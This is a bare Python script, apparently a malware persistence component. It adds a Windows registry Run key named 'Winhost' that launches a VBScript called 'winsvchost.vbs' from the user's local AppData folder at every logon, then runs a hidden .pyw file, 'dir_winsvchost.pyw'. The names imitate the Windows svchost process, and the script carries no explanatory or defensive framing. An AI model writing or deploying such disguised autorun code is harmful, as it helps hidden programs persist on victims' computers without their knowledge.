import winreg
import os

user = os.getlogin()

reg = '''"%windir%\system32\wscript.exe" "%localappdata%\winsvchost.vbs"'''

def set_run_key(key, value):
    """
    Set/Remove Run Key in windows registry.

    :param key: Run Key Name
    :param value: Program to Run
    :return: None
    """
    # This is for the system run variable
    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r'Software\Microsoft\Windows\CurrentVersion\Run',
        0, winreg.KEY_SET_VALUE)

    with reg_key:
        if value is None:
            winreg.DeleteValue(reg_key, key)
        else:
            if '%' in value:
                var_type = winreg.REG_EXPAND_SZ
            else:
                var_type = winreg.REG_SZ
            winreg.SetValueEx(reg_key, key, 0, var_type, value)

set_run_key('Winhost',reg)
os.system('python C://Users//' + str(user) + '\\AppData\\Local\\dir_winsvchost.pyw')